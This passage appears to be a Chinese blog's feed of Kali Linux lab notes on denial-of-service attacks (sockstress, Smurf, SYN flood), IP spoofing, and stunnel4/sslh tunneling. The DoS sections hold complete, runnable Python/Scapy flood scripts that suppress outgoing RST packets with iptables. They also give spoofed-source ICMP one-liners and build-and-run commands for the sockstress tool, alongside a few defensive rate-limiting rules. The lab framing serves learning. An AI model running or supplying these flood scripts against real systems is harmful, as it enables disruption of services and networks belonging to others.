<li>攻击者资源消耗小（CPU、内存、带宽）</li>
<li>异步攻击，单机可拒绝服务高配资源服务器</li>
<li>Window窗口实现TCP流控</li>
</ul>
</li>
</ul>
<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
<li>Kali（攻击者）<ul>
<li>网卡方式为NAT/Bridge方式，NAT/桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Metasploit（被攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-实验–Python脚本"><a href="#3-实验–Python脚本" class="headerlink" title="3. 实验–Python脚本"></a>3. 实验–Python脚本</h4><ul>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>python脚本：<strong><code>🔺命令：./sockstress.py Metasploit的IP 21 200</code></strong></li>
<li>▲ 2020.2.9此脚本攻击效果甚微弱</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
#_*_ coding:utf-8 _*_

from scapy.all import *
from time import sleep
import thread
import logging
import os
import signal
import sys
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print &quot;用法：./sockstress.py [目标IP] [端口] [线程数]&quot;
    print &quot;举例：./sockstress.py 10.0.0.5 21 20 ## 请确定被攻击端口处于开放状态&quot;
    sys.exit()

target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])

## 攻击函数
def sockstress(target,dstport):
    while 0 == 0:
        try:
            x = random.randint(0,65535)
            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags=&quot;S&quot;),timeout=1,verbose=0)
            send(IP(dst=target)/TCP(sport=x,dport=dstport,window=0,flags=&quot;A&quot;,ack=(response[TCP].seq+1))/&#39;\x00\x00&#39;,verbose=0)
        except:
            pass

## 停止攻击函数
def shutdown(signal,frame):
    print &quot;正在恢复iptables 规则&quot;
    os.system(&#39;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d&#39;+target+&#39; -j DROP&#39;)
    sys.exit()

## 添加iptables规则
os.system(&#39;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d&#39;+target+&#39; -j DROP&#39;)
signal.signal(signal.SIGINT,shutdown)

## 多线程攻击
print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;
for x in range(0,threads):
    thread.start_new_thread(sockstress,(target,dstport))

## 永远执行
while 0==0:
    sleep(1)</code></pre><ul>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
<li><strong><code>🔺命令：Free -m</code></strong>（查看系统所用资源）</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" srcset="/img/loading.gif" alt="服务器资源图"></p>
<h4 id="4-实验–C脚本"><a href="#4-实验–C脚本" class="headerlink" title="4. 实验–C脚本"></a>4. 实验–C脚本</h4><ul>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>防火墙规则：<strong><code>🔺命令：iptables -A OUTPUT -p TCP --tcp-flags rst rst -d Metasploit的IP -j DROP</code></strong></li>
<li>下载地址：<a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">https://github.com/defuse/sockstress</a> </li>
<li><strong><code>🔺命令：gcc -Wall -c sockstress.c</code></strong> </li>
<li><strong><code>🔺命令：gcc -pthread -o sockstress sockstress.o</code></strong> </li>
<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0</code></strong> </li>
<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0 -p payloads/http -d 10</code></strong></li>
</ul>
</li>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
<li><strong><code>🔺命令：free -m</code></strong>（查看系统所用资源）</li>
</ul>
</li>
</ul>
<h4 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h4><ul>
<li>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式</li>
<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效（syn cookie对半步连接有效）</li>
<li>根本的防御方法是采用白名单（不实际）</li>
<li>折中对策：限制单位时间内每IP建的TCP连接数<ul>
<li>封杀每30秒与80端口建立连接10个的IP地址</li>
<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></strong></li>
<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></strong></li>
<li>以上规则对DDoS攻击无效</li>
</ul>
</li>
<li>▲ 可在Metasploit中加入iptables规则，Kali进行DoS尝试</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十)：Smurf</title>
    <url>/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81)%EF%BC%9ASmurf/</url>
    <content><![CDATA[<hr>
<h4 id="1-Smurf"><a href="#1-Smurf" class="headerlink" title="1. Smurf"></a>1. Smurf</h4><ul>
<li>世界上最古老的DDoS攻击<ul>
<li>向广播地址发送伪造源地址的ICMP echo Requset（ping）包</li>
<li>LAN所有计算机向伪造源地址返回响应包</li>
<li>对现代操作系统几乎失效（不响应目标为广播的ping）</li>
</ul>
</li>
</ul>
<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
<li>Kali（攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Metasploit（被攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
<li>Metasploit（被攻击者）<ul>
<li>ifconfig查看IP地址</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>Scapy<ul>
<li>i=IP() </li>
<li>i.src=”Metasploit的IP地址”</li>
<li>i.dst=”网关的IP地址” </li>
<li>p=ICMP() </li>
<li>p.display() </li>
<li>send(i/p)</li>
</ul>
</li>
<li>▲ send(IP(dst=”网关IP地址”,src=”Metasploit的IP地址”)/ICMP(),count=100,verbose=1)</li>
</ul>
</li>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：sudo tcpdump -i eth0</code></strong>（进行数据包抓取）</li>
<li>查看局域网内是否有机器对伪造的源地址进行回应</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十九)：Syn-Flood</title>
    <url>/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B9%9D)%EF%BC%9ASyn-Flood/</url>
    <content><![CDATA[<hr>
<h4 id="1-Syn-Flood"><a href="#1-Syn-Flood" class="headerlink" title="1. Syn-Flood"></a>1. Syn-Flood</h4><ul>
<li>常伴随IP欺骗<ul>
<li>真正的攻击目标</li>
</ul>
</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>i.dst=1.1.1.1</li>
<li>i.display()</li>
<li>t=TCP()</li>
<li>sr1(i/t,verbose=1,timeout=3)</li>
<li>sr1(IP(dst=1.1.1.1)/TCP())</li>
</ul>
</li>
<li>▲ 占去服务器最大的TCP连接方式，但不一定占满CPU和内存</li>
</ul>
<p><img src="/images/kali/kali-notepad/Syn-Flood.PNG" srcset="/img/loading.gif" alt="Syn-Flood"></p>
<h4 id="2-实验–准备"><a href="#2-实验–准备" class="headerlink" title="2. 实验–准备"></a>2. 实验–准备</h4><ul>
<li>Kali（攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Metasploit（Linux被攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window XP SP3（Winodws被轰击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-实验–Linux"><a href="#3-实验–Linux" class="headerlink" title="3. 实验–Linux"></a>3. 实验–Linux</h4><ul>
<li>Metasploit（Linux被攻击者）<ul>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>查看开放的端口（TCP端口，<strong><code>🔺命令：netstat -pantu</code></strong>查看）</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>Scapy<ul>
<li>i=IP()</li>
<li>i.dst=”Metasploit的IP”</li>
<li>i.display()</li>
<li>t=TCP()</li>
<li>t.dport=22</li>
<li>t.display()（查看发包是否flags=S）</li>
<li>sr1(i/t,verbose=1,timeout=3)（查看回包是否flags=SA）</li>
</ul>
</li>
<li>▲ sr1(IP(dst=”Metasploit的IP”)/TCP())</li>
<li>开启Wireshark开启抓包，重新发送数据包（ip add eq Metasploit的IP），RST数据包会让被攻击者丢弃建立的SYN/ACK数据包</li>
<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Metasploit的IP -j DROP</code></strong></li>
<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
<li>重新发送数据包（ip add eq Metasploit的IP），看是否出现RST数据包，会出现一个TCP Retransmission重传数据包</li>
<li>先连接<strong><code>🔺命令：ssh msfadmin@Metasploit的IP</code></strong>，尝试连接速度是否延迟</li>
<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Metasploit的IP 22 200</code></strong></li>
<li>在攻击的同时开启Wireshark抓包查看数据包，并ssh登陆看是否能登陆</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
#_*_ coding:utf-8 _*_

from scapy.all import *
from time import sleep
import thread
import random
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print &quot;用法：./syn_flood.py [IP端口] [端口] [线程数]&quot;
    print &quot;举例：./syn_flood.py 1.1.1.1 80 20&quot;
    sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

print &quot;正在执行SYN Flood 攻击，按 Ctrl+C 停止攻击&quot;
def synflood(target,port):
    while 0 == 0:
        x = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)

for x in range(0,threads):
    thread.start_new_thread(synflood,(target,port))

while 0 == 0:
    sleep(1)</code></pre><ul>
<li>Metasploit（Linux被攻击者）<ul>
<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU和内存是否提高或者不变</li>
<li>查看TCP连接：<strong><code>🔺命令：netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code></strong></li>
</ul>
</li>
</ul>
<h4 id="4-实验–Window"><a href="#4-实验–Window" class="headerlink" title="4. 实验–Window"></a>4. 实验–Window</h4><ul>
<li>Window XP SP3（Winodws被攻击者）<ul>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
<li>开启远程桌面，设置administrator密码（空密码不允许登陆）</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li><strong><code>🔺命令：rdesktop</code></strong>尝试登陆，连接速度是否延迟</li>
<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Window XP SP3的IP -j DROP</code></strong></li>
<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Window XP SP3的IP 3389 10</code></strong></li>
<li>在攻击的同时开启Wireshark抓包查看数据包，并rdesktop远程桌面登陆看是否能登陆</li>
</ul>
</li>
<li>▲ Windows系统默认半开连接数10个</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十八)：TCP连接、IP地址欺骗</title>
    <url>/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/</url>
    <content><![CDATA[<hr>
<h4 id="1-TCP连接"><a href="#1-TCP连接" class="headerlink" title="1. TCP连接"></a>1. TCP连接</h4><p><img src="/images/kali/kali-notepad/TCP%E5%8D%8F%E8%AE%AE%E8%BF%87%E7%A8%8B.PNG" srcset="/img/loading.gif" alt="TCP协议过程"></p>
<ul>
<li>TCP三次握手<ul>
<li>▲ TCP三次握手其实不是可靠的，存在悖论，最后一次握手的ACK无法确定服务器已收到</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.PNG" srcset="/img/loading.gif" alt="TCP三次握手"></p>
<ul>
<li>TCP四次挥手</li>
</ul>
<p><img src="/images/kali/kali-notepad/TCP%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.PNG" srcset="/img/loading.gif" alt="TCP四次挥手"></p>
<h4 id="2-IP地址欺骗"><a href="#2-IP地址欺骗" class="headerlink" title="2. IP地址欺骗"></a>2. IP地址欺骗</h4><ul>
<li>经常用于DoS攻击</li>
<li>根据IP头地址寻址<ul>
<li>伪造IP源地址</li>
</ul>
</li>
<li>边界路由过滤器<ul>
<li>入站、出站</li>
</ul>
</li>
<li>受害者可能是源、目的地址</li>
<li>绕过基于地址的验证</li>
<li>压力测试模拟多用户</li>
<li>上层协议（TCP序列号）▲ TCP链路劫持</li>
<li>▲ ISP设置出站流量的策略，对伪造源地址出站流量的过滤（边界防火墙）</li>
<li>▲ ISP设置入站流量的策略，对伪造内网地址入站流量的过滤（边界防火墙） </li>
</ul>
<p><img src="/images/kali/kali-notepad/IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97.PNG" srcset="/img/loading.gif" alt="IP地址欺骗"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十七)：DoS介绍及分类</title>
    <url>/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<hr>
<h4 id="1-拒绝服务"><a href="#1-拒绝服务" class="headerlink" title="1. 拒绝服务"></a>1. 拒绝服务</h4><ul>
<li>DoS不是DOS<ul>
<li>利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务</li>
</ul>
</li>
<li>DDoS分布式拒绝服务<ul>
<li>一对一的攻击完全拼各自的资源，效果差</li>
<li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li>
</ul>
</li>
<li>历史<ul>
<li>以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖）</li>
<li>现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索）<ul>
<li>电商网站被勒索，Bill gates僵尸程序</li>
<li>贩卖和租用肉鸡已经称为黑产中重要的一部分</li>
<li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费</li>
</ul>
</li>
</ul>
</li>
<li>Anonymous匿名者<ul>
<li>世界最著名的黑客组织</li>
<li>组织结构宽松，人员来自世界各地</li>
<li>以DDoS攻击著称的无政府主义者</li>
<li>亦正亦邪，攻击恐怖组织也攻击政府宗教机构</li>
<li>近些年来涉足政治斗争</li>
<li>成员露面时均带有Guy Fawkes面具</li>
<li>最早的核心成员来自4chan图片社区</li>
<li>惯常雇佣外围黑客成员发动DDoS</li>
<li>口号：<ul>
<li>We are Anonymous,We are a Legion,We do not forgive,We do not forget,<br>Expect us.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/%E5%8C%BF%E5%90%8D%E8%80%85.PNG" srcset="/img/loading.gif" alt="Anonymous匿名者"></p>
<h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2. DoS分类"></a>2. DoS分类</h4><ul>
<li>D网络<ul>
<li>基于巨量的Flood耗尽目标网络带宽资源（打掉服务器的出口带宽）</li>
<li>ICMP Flood、UDP Flood</li>
</ul>
</li>
<li>D协议<ul>
<li>攻击协议漏洞发起的拒绝服务攻击</li>
<li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL</li>
<li>▲ Syn → Syn/Ack → ACK（服务器一直等待最后的ACK导致DoS）</li>
<li>▲ ARP（基于传闻的协议，发送即被接受）</li>
</ul>
</li>
<li>D应用<ul>
<li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li>
<li>大量频繁访问消耗系统资源严重的应用（CC）</li>
<li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li>
<li>可以是一击毙命的，也可以是耗尽目标资源的</li>
</ul>
</li>
</ul>
<h4 id="3-为何被DoS"><a href="#3-为何被DoS" class="headerlink" title="3. 为何被DoS"></a>3. 为何被DoS</h4><ul>
<li>从攻击者到被害者<ul>
<li>网络（网络设备等）→ FireWall → 服务器OS → 服务应用</li>
</ul>
</li>
<li>资源耗尽<ul>
<li>网络：带宽</li>
<li>Firewall：吞吐量、并发连接</li>
<li>服务器：CPU、内存、I/O</li>
<li>应用：处理请求能力、对OS资源的使用权</li>
</ul>
</li>
<li>程序漏洞攻击<ul>
<li>缓冲区溢出</li>
<li>协议、程序逻辑漏洞</li>
</ul>
</li>
<li>链路上任何一点都可成为目标</li>
</ul>
<p><img src="/images/kali/kali-notepad/DoS%E9%93%BE%E8%B7%AF.PNG" srcset="/img/loading.gif" alt="DoS链路"></p>
<h4 id="4-DDoS分类方法"><a href="#4-DDoS分类方法" class="headerlink" title="4. DDoS分类方法"></a>4. DDoS分类方法</h4><p><img src="/images/kali/kali-notepad/DDoS%E5%88%86%E7%B1%BB%E6%96%B9%E6%B3%95.PNG" srcset="/img/loading.gif" alt="DDoS分类方法"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十六)：封装TCP流量隧道--stunnel4</title>
    <url>/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%B0%81%E8%A3%85TCP%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93--stunnel4/</url>
    <content><![CDATA[<hr>
<h4 id="1-stunnel4"><a href="#1-stunnel4" class="headerlink" title="1. stunnel4"></a>1. stunnel4</h4><ul>
<li>无需修改原代码的情况下将TCP流量封装于SSL通道内</li>
<li>适用于本身不支持加密传输的应用</li>
<li>支持openssl安全特性</li>
<li>跨平台</li>
<li>性能优</li>
</ul>
<p><img src="/images/kali/kali-notepad/stunnel4.PNG" srcset="/img/loading.gif" alt="stunnel4"></p>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>bodhi（stunnel4 Server）<ul>
<li>网卡方式为NAT方式，检查网络</li>
</ul>
</li>
<li>metasploit（内网的应用服务器，mysql）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
<li>bodhi（stunnel4 Server）<ul>
<li><strong><code>🔺命令：apt-get install stunnel4</code></strong></li>
<li>网卡方式修改为Host-only方式，检查网络</li>
<li>浏览器访问mono防火墙</li>
<li>编辑上一个小节的NAT规则<ul>
<li>Protocol → TCP</li>
<li>External port range → from:3306</li>
<li>NAT IP → Metasploit的IP地址</li>
<li>Local port → 3306</li>
<li>保存更改的应用</li>
</ul>
</li>
<li>编辑上一小节的Rules规则（WAN口）<ul>
<li>Destination port range → from:other 3306/to:3306</li>
<li>保存更改的应用</li>
</ul>
</li>
</ul>
</li>
<li>Kali（stunnel4 Client）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>开启Wireshark抓包（ip.address=mono的WAN的IP）</li>
<li><strong><code>🔺命令：mysql -u root -h mono的WAN的IP</code></strong></li>
<li><strong><code>🔺命令：show databases;</code></strong></li>
<li>▲ Wireshark的TCP Stream可以查看到为明文信息</li>
</ul>
</li>
<li>bodhi（stunnel4 Server）<ul>
<li>生成证书：<strong><code>🔺命令：openssl req -new –days 365 -nodes -x509 -out /etc/stunnel/ stunnel.pem -keyout /etc/stunnel/stunnel.pem</code></strong></li>
<li>创建配置文件：/etc/stunnel/stunnel.conf<ul>
<li>cert = /etc/stunnel/stunnel.pem </li>
<li>setuid = stunnel4 </li>
<li>setgid = stunnel4 </li>
<li>pid = /var/run/stunnel4/stunnel4.pid </li>
<li>[mysqls] </li>
<li>accept  = 0.0.0.0:443</li>
<li>connect = Metasploit的IP:3306</li>
</ul>
</li>
<li>stunnel4自动启动<ul>
<li>/etc/default/stunnel4 → ENABLED=1</li>
</ul>
</li>
<li>启动stunnel4服务端<ul>
<li><strong><code>🔺命令：service stunnel4 start</code></strong>（netstat -pantu进行查看是否开启）</li>
</ul>
</li>
<li>浏览器登陆mono修改WAN的NAT<ul>
<li>External port range → HTTPS/HTTPS</li>
<li>NAT IP → bodhi的IP</li>
<li>保存应用</li>
</ul>
</li>
<li>浏览器登陆mono修改WAN的Rule规则<ul>
<li>Destination → Address → bodhi的IP</li>
<li>Destination port range → HTTPS/HTTPS</li>
<li>保存应用</li>
</ul>
</li>
</ul>
</li>
<li>Kali（stunnel4 Client）<ul>
<li>创建配置文件：/etc/stunnel/stunnel.conf<ul>
<li>client = yes </li>
<li>[mysqls]    </li>
<li>accept = 3306  </li>
<li>connect = mono的IP:443 </li>
</ul>
</li>
<li>客户端自动启动<ul>
<li>/etc/default/stunnel4 → ENABLED=1</li>
</ul>
</li>
<li>启动stunnel4客户端<ul>
<li><strong><code>🔺命令：service stunnel4 stop / start</code></strong>（netstat -pantu进行查看是否开启）</li>
</ul>
</li>
<li>开启Wireshark抓包（ip.address=mono的IP）</li>
<li><strong><code>🔺命令：mysql -u root -h 127.0.0.1</code></strong></li>
<li><strong><code>🔺命令：show databases;</code></strong></li>
<li>▲ Wireshark的TCP Stream可以查看到为加密信息</li>
</ul>
</li>
<li>▲ 2020.2.3外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关，后面有关stunnel的实验都未作，猜测VMware自带网卡的问题</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十五)：一端口多服务隧道--sslh</title>
    <url>/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%80%E7%AB%AF%E5%8F%A3%E5%A4%9A%E6%9C%8D%E5%8A%A1%E9%9A%A7%E9%81%93--sslh/</url>
    <content><![CDATA[<hr>
<h4 id="1-sslh（ssl-ssh）"><a href="#1-sslh（ssl-ssh）" class="headerlink" title="1. sslh（ssl+ssh）"></a>1. sslh（ssl+ssh）</h4><ul>
<li>端口分配器<ul>
<li>根据客户端第一个包检测协议类型</li>
<li>根据协议检测结果将流量转发给不同目标</li>
<li>支持HTTP、HTTPS、SSH、OpenVPN、tinc、XMAPP和可基于正则表达式判断的人和协议类型</li>
<li>适用于防火墙允许443端口入站访问流量的环境</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/sslh.PNG" srcset="/img/loading.gif" alt="sslh"></p>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>Kali（SSLH）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
<li>Window Server 2003（内网的CA服务器）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
<li>安装web server<ul>
<li>Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS → 万维网服务/Active Server Pages，可能需要光盘）</li>
</ul>
</li>
<li>安装CA服务器<ul>
<li>Win+R → appwiz.cpl → 更改或添加程序 → 证书服务 </li>
<li>独立根CA类型、证书名称：LAB CA、有效期限</li>
</ul>
</li>
<li>开始 → Internet信息服务（IIS）管理器<ul>
<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
<li>目录安全性 → 服务器证书 → 名称：<a href="http://www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市" target="_blank" rel="noopener">www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市</a> → 修改申请文件放置位置</li>
<li>浏览器范围访问<a href="http://127.0.0.1/certsrv/" target="_blank" rel="noopener">http://127.0.0.1/certsrv/</a> → 申请证书 → 高级证书 → BASE64编码 → 粘贴证书服务器代码 → 提交</li>
</ul>
</li>
<li>开始 → 证书服务器管理<ul>
<li>LAB CA → 挂起的申请 → 选中申请的证书右键 → 所有任务 → 颁发</li>
<li>证书可以在颁发的证书中查看详细信息</li>
</ul>
</li>
<li>浏览器范围访问<a href="http://127.0.0.1/certsrv/" target="_blank" rel="noopener">http://127.0.0.1/certsrv/</a> → 查看挂起的证书申请状态 → 下载证书 → 保存在桌面 </li>
<li>开始 → Internet信息服务（IIS）管理器<ul>
<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
<li>目录安全性 → 服务器证书 → 处理挂起的请求并安装证书 </li>
<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
<li>目录安全性 → 查看证书</li>
<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
<li>目录安全性 → 编辑 → 要求安全通道（SSL）</li>
<li>停止网站 → 重新启动</li>
</ul>
</li>
</ul>
</li>
<li>Kali（SSLH）<ul>
<li>浏览器访问<a href="https://Window" target="_blank" rel="noopener">https://Window</a> Server 2003的IP，看是否能通过SSL通道进行通信</li>
<li>配置文件：<strong><code>🔺命令：vi /etc/default/sslh</code></strong><ul>
<li>RUN=yes</li>
<li>DAEMON=/usr/sbin/sslh</li>
<li>DAEMON_OPTS=”–user sslh –listen 本机的IP:443 –ssh 127.0.0.1:22 –http 127.0.0.1:80  –ssl Window Server 2003的IP:443 –pidfile /var/run/sslh/sslh.pid”</li>
</ul>
</li>
<li>启动apache服务，修改侦听端口<strong><code>🔺命令：vi /etc/apache2/ports.conf</code></strong> → 127.0.0.1:80，重启apache服务，<strong><code>🔺命令：netstat -pantu</code></strong>查看是否更改</li>
<li>开启SSH服务（修改SSH配置文件）</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>浏览器访问mono防火墙</li>
<li>新建NAT规则<ul>
<li>Interface → WAN</li>
<li>External address → Interface address（若为网段其他的IP映射，需设置为WAN address → Server NAT → 加入整个网段）</li>
<li>Protocol → TCP</li>
<li>External port range → HTTPS/HTTPS</li>
<li>NAT IP → KALI的IP</li>
<li>Auto-add a firewall rule to permit traffic through this NAT rule</li>
</ul>
</li>
<li>保存应用，Rules的WAN口多出一条rule</li>
</ul>
</li>
<li>Kali（SSLH）<ul>
<li><strong><code>🔺命令：service sslh start</code></strong>（netstat -pantu进行查看）</li>
<li>浏览器验证本机http是否正常进行</li>
</ul>
</li>
<li>物理机<ul>
<li>浏览器访问http://防火墙WAN的IP:443 → Kali的Web资源</li>
<li>浏览器访问https://防火墙WAN的IP → Window Server 2003的Web资源</li>
<li>ssh尝试登陆防火墙WAN的IP:443进行登陆</li>
</ul>
</li>
<li><strong><code>🔺命令：namp -p443 -sV -A 防火墙WAN的IP</code></strong><ul>
<li>基本可以扫描出所有的服务</li>
</ul>
</li>
<li>▲ 2020.2.3内网sslh代理正常，原因在于访问Kali IP三种方式都能代理，但外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十四)：HTTP(S)隧道--proxyptunnel</title>
    <url>/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%9B%9B)%EF%BC%9AHTTP(S)%E9%9A%A7%E9%81%93--proxytunnel/</url>
    <content><![CDATA[<hr>
<h4 id="1-proxytunnel"><a href="#1-proxytunnel" class="headerlink" title="1. proxytunnel"></a>1. proxytunnel</h4><ul>
<li>通过标准的HTTP/HTTPS代理创建隧道的工具</li>
<li>通过HTTP CONNECT方法封装信息</li>
<li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li>
